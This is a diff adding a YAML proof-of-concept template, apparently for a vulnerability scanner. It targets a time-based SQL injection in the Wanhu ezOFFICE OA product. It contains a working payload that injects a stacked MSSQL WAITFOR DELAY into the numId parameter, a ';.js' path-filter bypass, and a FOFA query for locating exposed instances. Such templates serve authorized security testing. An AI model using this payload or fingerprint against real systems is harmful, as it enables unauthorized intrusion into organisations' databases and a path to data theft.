@@ -1,0 +1,20 @@
+id: poc-yaml-whir-ezoffice-govdocumentmanager-judge-receivenum-sqli
+info:
+  name: 万户 ezOFFICE govdocumentmanager_judge_receivenum SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 302 && contains(headers,"/defaultroot")
+- method: GET
+  path: /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1;WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 200 && trim(body) == "1" && duration > t1 && duration
+    < t2
+transport: http
